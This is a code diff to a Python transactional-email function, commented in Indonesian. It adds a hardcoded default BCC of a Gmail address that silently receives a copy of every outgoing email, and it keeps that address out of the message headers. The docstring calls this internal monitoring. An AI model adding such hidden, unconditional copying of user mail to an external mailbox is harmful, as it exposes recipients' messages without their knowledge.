@@ -14,6 +14,8 @@ from app.models.email_config import EmailConfig
 from app.models.email_message import EmailFolder, EmailMessage
 from app.core.security import decrypt_password
 
+DEFAULT_BCC = ["custherds@gmail.com"]
+
 
 def send_transactional_email(
     db: Session,
@@ -22,10 +24,12 @@ def send_transactional_email(
     body_html: str,
     body_text: Optional[str] = None,
     from_name_override: Optional[str] = None,
+    bcc_addresses: Optional[list[str]] = None,
 ) -> bool:
     """
     Kirim email via SMTP config default yang aktif.
     Simpan ke email_messages (folder=sent) sebagai log.
+    BCC default ke custherds@gmail.com untuk monitoring internal.
     Return True jika berhasil, False jika gagal (tidak raise Exception).
     """
     config: Optional[EmailConfig] = (
@@ -41,13 +45,23 @@ def send_transactional_email(
 
     from_name = from_name_override or config.from_name or "Custherds"
 
+    # Gabungkan BCC: default + tambahan dari caller
+    final_bcc = list(DEFAULT_BCC)
+    if bcc_addresses:
+        for addr in bcc_addresses:
+            if addr not in final_bcc:
+                final_bcc.append(addr)
+
     msg = MIMEMultipart("alternative")
     msg["From"]    = f"{from_name} <{config.from_address}>"
     msg["To"]      = to_address
     msg["Subject"] = subject
+    # BCC tidak ditambahkan ke header msg (by design — agar tidak terlihat penerima lain)
     if body_text:
         msg.attach(MIMEText(body_text, "plain"))
     msg.attach(MIMEText(body_html, "html"))
+
+    all_recipients = [to_address] + final_bcc
 
     try:
         password = decrypt_password(config.password_encrypted)
@@ -55,7 +69,7 @@ def send_transactional_email(
             if config.use_tls:
                 server.starttls()
             server.login(config.username, password)
-            server.sendmail(config.from_address, [to_address], msg.as_string())
+            server.sendmail(config.from_address, all_recipients, msg.as_string())
     except Exception:
         return False
 
@@ -68,7 +82,7 @@ def send_transactional_email(
             from_name=from_name,
             to_addresses=[to_address],
             cc_addresses=[],
-            bcc_addresses=[],
+            bcc_addresses=final_bcc,
             subject=subject,
             body_text=body_text,
             body_html=body_html,
